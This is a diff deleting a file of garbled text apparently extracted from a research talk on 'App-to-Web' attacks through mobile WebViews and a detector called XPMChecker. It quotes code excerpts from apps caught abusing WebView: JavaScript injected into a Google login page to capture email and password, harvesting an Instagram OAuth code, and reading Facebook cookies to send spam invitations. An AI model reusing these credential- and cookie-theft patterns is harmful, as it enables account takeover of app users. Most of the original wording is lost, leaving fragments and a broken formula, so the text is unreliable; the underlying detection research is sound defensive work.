@@ -1,191 +1,0 @@
-WebView
- 
-
-
-
-I. WEB
-II. SPPXPM III. XPM IV.  V. 
-
-Web
-WEB
-·    · Web 
-
-
-WebView 
-·  · Web
-· WebView on Android · UIWebView/WKWebView on iOS
-
-WebView Mobile app
-
-WebView API
-
-WebViewAPIWeb
-
-Manipulated Web Resources
-
-Android WebView
-
-iOS UIWebView
-
-iOS WKWebView
-
-Local Storage
-
-CookieManager
-
-NSHTTPCookieStorage
-
-WKWebsiteDataStorage
-
-Web Content Web Address Network Traffic
-
-loadUrl, evaulateJavascript
-
-stringByEvaluatingJavascriptFr omString
-
-evaluateJavascript
-
-onPageFinished, shouldOverrideUrlLoading
-
-\
-
-\
-
-shouldInteceptRequest
-
-shouldStartLoadWithRequest
-
-decidePolicyForNavigationAction, decidePolicyForNavigationResponse
-
-Q: API
-
-App-to-Web Attacks
-WEB
-· WebView API
-
-Web
-
-App
-
-WebView API App-to-Web Attacks
-
-
-
-I. WEB
-II. SPPXPM
-III. XPM IV.  V. 
-
-SPPXPM
- Same Principal Policy (SPP)
-· WebWebSecurity Principal · WebSOPSame Origin Policy
-Cross Principal Manipulation (XPM)
-· PA  Web PW Web
-
-XPM
-AppWeb
-· C1FacebookApp · C2Chatous AppFacebook SDK · C3Chatous App
-· C1 & C2 not XPM · C3 XPM
-
-
-
-I. WEB II. SPPXPM
-III. XPM
-IV.  V. 
-
-XPM
-
-1. WebApp App 2. WebApp semantic gap
-Semantic Gap
-· netease & 163 · baidu & bd
-
-XPM
- 1. 
-1. WebView 2. Merkle-tree 3. 
-
-XPM
- 2. 
-1. PAPW 2. bag-of-word modelterm frequency 3. 
-
-cos %, ' =
-
-.
- ++
-+,-
-
-.
- A2+
-+,-
-
-.
- +2
-+,-
-
-XPMChecker
-
-1.  2.  3. XPM
-
-
-
-I. WEB II. SPPXPM III. XPM
-IV. 
-V. 
-
-XPMChecker 
-8wGoogle Play
-· 21 · 4iOS
- AppOAuth
- Cookies
-
- 2 6 14
-
-
-1APPOAuth
-Instaview
-1. 100-500 2. app TinderclientId
-package com.instaview.app; ... public class LoginActivity extends Activity{
-... // get Tinder's client ID String clientId = getTinderClientId(); ... this.webview.setWebViewClient(new WebViewClient() { public boolean shouldOverrideUrlLoading(WebView arg1, String url) {
-... // check if url is Instagram's OAuth API and extract the acess token for Tinder if (url.startsWith("api.instagram.com/oauth") && contains("code=") {
-String accessToken = url.substring(url.indexOf("code=") + 5, url.length()); // then use this token to access user's profile info ...
-
-2
-
-adkingkong
-1. 50-100 2. Google
-
-package co.kr.adkingkong.libs.autoinstall; ... public class GoogleWebLogin extends RelativeLayout {
-... // load Google login Web page this.webview.loadUrl("accounts.google.com"); ... this.webview.setWebViewClient(new WebViewClient() { public void onPageFinished(WebView arg1, String url) {
-... // inject JS to steal users' email and password arg1.loadUrl("javascript:
-if (document.getElementById('gaia_loginform') !== null) { document.getElementById(`gaia_loginform').onsubmit = function onSubmit(form) { // extract email and password from the login form email = document.getElementById(`email-display').innerHTML; passwd = document.getElementById(`Passwd').value);
-..."); ...
-
-3Cookies
-
-Chatous
-1. 1000-5000 2. FacebookCookies
- 
-
-package com.chatous.chatous.managers; ... public class FacebookManager extends Manager {
-... if (CookieManager.getInstance().getCookie("https://facebook.com") != null) {
-// get Facebook cookies cookies = CookieManager.getInstance().getCookie("https://facebook.com"); // use these cookies to access user's Facebook homepage DefaultHttpClient httpclient = new DefaultHttpClient(); htttpclient.setCookieStore(cookieStore); HttpResponse response =
-httpclient.execute(new HttpGet("https://facebook.com/first_degree.php?" + ...)); ... // get user's friend list and send spam invitations List<String> friends = parse_response(response); for (friend: friends) {
-send_invitations(friend); }
-
-
-
-I. WEB II. SPPXPM III. XPM IV. 
-V. 
-
-
-1. 
-1. Web 2. GoogleWebViewOAuth
-2. 
-1.  2. 
-
-
-1. App-to-Web Attacks 
-2. Same Principal PolicyWeb
-3. https://xhzhang.github.io/XPMChecker/
-
- 
-
-
